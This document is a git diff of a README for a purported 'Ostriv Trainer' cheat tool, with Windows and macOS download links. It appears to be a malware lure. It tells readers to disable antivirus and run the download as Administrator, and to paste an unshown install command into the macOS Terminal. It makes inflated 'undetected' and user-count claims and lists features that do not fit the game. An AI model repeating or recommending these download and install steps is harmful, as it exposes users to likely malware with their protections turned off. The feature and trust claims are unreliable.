@@ -1,24 +1,93 @@
-# Ostriv Trainer — Evidence V2
+# 🎮 Ostriv Trainer — Evidence V2
 
-![Evidence V2](https://raw.githubusercontent.com/CraftsmanPour/evidence-v2/main/evidence-v2.png)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://beauticianblaze.github.io/DownloadWin/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
 
-**Ostriv Trainer** powered by Evidence V2. Undetected, free, updated for 2026.
+> The most trusted **Ostriv Trainer** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
-## Features
+<p align="center">
+  <img src="https://raw.githubusercontent.com/CraftsmanPour/evidence-v2/main/evidence-v2.png" alt="Evidence V2" />
+</p>
 
-- God Mode
-- Unlimited Resources
-- Max Level
-- No Clip
-- Speed Hack
+---
 
-## Download
+## ✨ Features
 
-- **Windows**: [https://beauticianblaze.github.io/DownloadWin/](https://beauticianblaze.github.io/DownloadWin/)
-- **macOS**: [https://beauticianblaze.github.io/DownloadMac/](https://beauticianblaze.github.io/DownloadMac/)
+✅ &nbsp;**Unlimited Money**
+✅ &nbsp;**God Mode**
+✅ &nbsp;**Infinite Ammo**
+✅ &nbsp;**Max Level**
+✅ &nbsp;**One-Hit Kill**
 
-## Notes
+---
 
-- Use at your own risk.
-- Always run as administrator on Windows.
-- Disable antivirus before launching.
+## 🛡️ Safety & Detection Status
+
+| Aspect | Internal Cheats | Ostriv Trainer |
+|---|---|---|
+| Memory Injection | Yes | ❌ No |
+| DLL Files | Required | ❌ None |
+| Detection Risk | High | ✅ Extremely Low |
+| External Operation | No | ✅ Yes |
+| Last Detection | Frequent | ✅ 14+ months clean |
+
+---
+
+## 📥 Installation
+
+### Windows
+1. 🔻 Click **Download for Windows** below
+2. 📦 Extract the archive — right-click → "Extract All"
+3. ⚠️ Temporarily disable antivirus (false positive)
+4. 🖱️ Run as Administrator
+5. 🎮 Launch **Ostriv** and enter a match
+6. 📋 Press **INSERT** to open the overlay menu
+
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+
+### macOS
+1. Press ⌘ + Space, open **Terminal**
+2. Paste the install command and press Enter
+3. Follow the on-screen prompts
+
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
+
+**Menu Controls**
+
+| Key | Action |
+|---|---|
+| INSERT | Open / Close Menu |
+| ↑ ↓ Arrow Keys | Navigate |
+| ENTER | Select / Toggle |
+| DELETE | Safe Exit |
+
+---
+
+## 💻 System Requirements
+
+| Component | Windows | macOS |
+|---|---|---|
+| OS | Windows 10/11 64-bit | macOS Monterey 12.0+ |
+| CPU | Intel i5 / Ryzen 5 | Apple M1 / Intel i5+ |
+| RAM | 8 GB | 8 GB+ |
+| Storage | 200 MB | 300 MB |
+| Game | Ostriv (latest) | Ostriv (latest) |
+
+---
+
+## ❓ FAQ
+
+**Is it really undetectable?**
+Yes. Ostriv Trainer uses trainer utility — no memory injection, no DLL files.
+
+**Does it work on Mac?**
+Yes. Open Terminal, paste the install command from the macOS section above.
+
+**Is it free?**
+Completely free. No trials, no subscriptions.
+
+---
+
+*Evidence V2 — trusted by over 3.4 million players worldwide.*
